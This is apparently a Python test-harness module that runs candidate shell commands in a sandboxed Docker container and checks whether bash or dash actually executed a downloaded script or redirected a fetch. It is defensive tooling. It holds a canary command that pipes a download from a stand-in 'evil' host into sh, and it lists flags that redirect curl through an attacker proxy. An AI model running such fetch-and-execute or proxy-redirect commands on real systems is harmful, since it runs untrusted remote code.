"""Host side: run candidate strings in the container and read back what a real shell did."""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import uuid
from pathlib import Path

IMAGE = "python:3.11-slim"
_RUNNER = Path(__file__).with_name("runner.py").read_text(encoding="utf-8")
_LEX_RUNNER = Path(__file__).with_name("lexrunner.py").read_text(encoding="utf-8")


def docker_ready() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        return subprocess.run(["docker", "image", "inspect", IMAGE], capture_output=True, timeout=30).returncode == 0
    except (OSError, subprocess.TimeoutExpired):
        return False


# A candidate that must always run: if a batch cannot show it, the container was unable to run anything (a full process table, a killed shell) and every verdict in that batch would be a silent "nothing happened".
_CANARY = "curl https://evil.example/canary | sh"


def execute(candidates: list[str], *, batch: int = 250) -> list[dict]:
    """For each candidate: `{"bash": {"sink_ran", "fetches", "other"}, "dash": {...}}`, from a real shell in a container with no network, no capabilities, a read-only root and small limits. A canary before and after every batch proves the container was still able to run a download; `--init` reaps the children a trailing `&` leaves behind."""
    results: list[dict] = []
    for i in range(0, len(candidates), batch):
        chunk = [_CANARY, *candidates[i:i + batch], _CANARY]
        name = f"ds-oracle-{uuid.uuid4().hex[:12]}"
        cmd = ["docker", "run", "--rm", "--init", "-i", "--name", name, "--network=none", "--cap-drop=ALL", "--memory=256m",
               "--pids-limit=128", "--read-only", "--tmpfs", "/tmp:exec,nosuid,size=64m", IMAGE, "python", "-u", "-c", _RUNNER]
        try:
            done = subprocess.run(cmd, input=json.dumps(chunk), capture_output=True, text=True, timeout=60 + 3 * len(chunk))
        finally:
            subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=30)      # a timed-out run leaves it behind
        if done.returncode != 0:
            raise RuntimeError(f"the oracle container failed: {done.stderr[-500:]}")
        rows = json.loads(done.stdout)
        for canary in (rows[0], rows[-1]):
            if not all(canary[shell]["sink_ran"] for shell in ("bash", "dash")):
                raise RuntimeError("the oracle container could not run its canary download: its verdicts would mean nothing")
        results.extend(rows[1:-1])
    return results


def really_runs_the_download(row: dict) -> bool:
    """A real shell (or a stdin interpreter) ran the script the stub `curl` printed, unmodified or not."""
    return any(row[s]["sink_ran"] or row[s]["modified"] for s in ("bash", "dash")) and any(row[s]["fetches"] for s in ("bash", "dash"))


def fetch_violations(row: dict, known_urls: set[str]) -> list[str]:
    """What a SOFTENED command did that a documented installer does not: fetched a URL that is not one of `known_urls` (literally: a dotless host or a scheme-less one counts), sent a proxy variable, altered the downloaded script, or called any other program."""
    problems: list[str] = []
    for shell in ("bash", "dash"):
        result = row[shell]
        for line in result["fetches"]:
            _, _, rest = line.partition(" ")
            argv, _, proxy = rest.rpartition(" PROXY=")
            positional = _positional(argv.split()[1:])
            problems += [f"[{shell}] fetched {t}" for t in positional if t not in known_urls]
            if proxy:
                problems.append(f"[{shell}] proxy {proxy}")
        problems += [f"[{shell}] {o}" for o in result["other"]]
        if result["modified"]:
            problems.append(f"[{shell}] the downloaded script was altered on the way")
    return problems


# What a documented installer's download may carry. Everything else that starts with a dash (`--proxy=http://evil`, `-xhttp://evil`, `--url=…`, `--config=/tmp/x`, `-Hx:evil`) is a way to redirect or reshape the fetch, whether or not it is glued to its value.
_SAFE_FLAGS = {"-f", "-s", "-S", "-L", "-q", "-fsSL", "-sSf", "-LsSf", "-sS", "-fsS", "-fL", "-o-", "-O-", "-qO-", "--tlsv1.2", "-"}
_VALUE_FLAGS = {"--proto": re.compile(r"=https"), "--retry": re.compile(r"\d+"), "-o": re.compile(r"-"), "-O": re.compile(r"-")}


def _positional(args: list[str]) -> list[str]:
    """The arguments of a logged curl/wget call that are not one of the documented installer's own flags: URLs and words (as themselves), and any other flag or a flag with an unexpected value (as `flag X`)."""
    out, expect = [], None
    for a in args:
        if expect is not None:
            if not expect.fullmatch(a):
                out.append(f"flag value {a}")
            expect = None
        elif a in _VALUE_FLAGS:
            expect = _VALUE_FLAGS[a]
        elif a in _SAFE_FLAGS:
            continue
        elif a.startswith("-"):
            out.append(f"flag {a}")
        else:
            out.append(a.strip("'\""))
    return out


# What a shell says when a fragment ends inside a construct (as opposed to any other syntax error, which stops it earlier).
# A quote, a substitution, `${…}`, a subshell or a here-document left open; a compound command left open (`case`, `{`, `[[`) swallows nothing.
_UNTERMINATED = {"bash": re.compile(r"unexpected EOF while looking for matching|here-document at line \d+ delimited by end-of-file"),
                 "dash": re.compile(r"Unterminated quoted string|Missing '\}'|Missing '\)\)'|end of file unexpected \(expecting \"\)\"\)")}
_OTHER_ERROR = re.compile(r"syntax error|Syntax error|bad substitution|unexpected token|not found|cannot execute binary file")      # bash refuses a NUL in the first line


def read_diagnostics(shell: str, message: str) -> bool | None:
    """What `-n` said about a fragment: True if a construct is still open where the text ends, False if it parses cleanly, None if the shell stopped at another syntax error first (bash goes on reading to the end of that line, so a later report of an open construct does not count) or did not answer in time."""
    if message == "timeout":
        return None
    lines = message.split("\n")
    end = next((k for k, ln in enumerate(lines) if _UNTERMINATED[shell].search(ln)), None)
    other = next((k for k, ln in enumerate(lines) if _OTHER_ERROR.search(ln) and not _UNTERMINATED[shell].search(ln)), None)
    return None if other is not None and (end is None or other < end) else end is not None


def _messages(texts: list[str], batch: int = 400) -> list[dict[str, str]]:
    """What `bash -n` and `dash -n` printed for each text, from a container with no network, no capabilities and a read-only root."""
    out: list[dict[str, str]] = []
    for i in range(0, len(texts), batch):
        chunk = texts[i:i + batch]
        name = f"ds-oracle-{uuid.uuid4().hex[:12]}"
        cmd = ["docker", "run", "--rm", "--init", "-i", "--name", name, "--network=none", "--cap-drop=ALL", "--memory=256m",
               "--pids-limit=128", "--read-only", "--tmpfs", "/tmp:exec,nosuid,size=64m", IMAGE, "python", "-u", "-c", _LEX_RUNNER]
        try:
            done = subprocess.run(cmd, input=json.dumps(chunk), capture_output=True, text=True, timeout=60 + len(chunk))
        finally:
            subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=30)
        if done.returncode != 0:
            raise RuntimeError(f"the oracle container failed: {done.stderr[-500:]}")
        out.extend(json.loads(done.stdout))
    return out


def open_at_end(fragments: list[str], *, batch: int = 400) -> list[dict[str, bool | None]]:
    """For each fragment, per shell: `read_diagnostics` of what `bash -n` and `dash -n` said."""
    return [{shell: read_diagnostics(shell, message) for shell, message in said.items()} for said in _messages(fragments, batch)]


_QUOTE_UNTERMINATED = {
    "'": {"bash": re.compile(r"unexpected EOF while looking for matching `'"), "dash": re.compile(r"Unterminated quoted string")},
    '"': {"bash": re.compile(r"unexpected EOF while looking for matching `\""), "dash": re.compile(r"Unterminated quoted string")},
}


def read_probe(shell: str, quote: str, message: str) -> bool | None:
    """A fragment that nothing is open in, followed by a line holding one `quote`: True if the shell did NOT call that quote unterminated (it swallowed the line: it was inside a string, a here-document or a substitution), False if it did, None if it stopped at another syntax error first or did not answer."""
    if message == "timeout":
        return None
    lines = message.split("\n")
    reported = next((k for k, ln in enumerate(lines) if _QUOTE_UNTERMINATED[quote][shell].search(ln)), None)
    other = next((k for k, ln in enumerate(lines) if _OTHER_ERROR.search(ln) and not _UNTERMINATED[shell].search(ln)), None)
    if other is not None and (reported is None or other < reported):
        return None
    return reported is None


def probe_swallowed(fragments: list[str], quote: str) -> list[dict[str, bool | None]]:
    """For each fragment, per shell: `read_probe` after a line with one `quote` has been put behind it."""
    return [{shell: read_probe(shell, quote, message) for shell, message in said.items()}
            for said in _messages([f + quote + "\n" for f in fragments])]
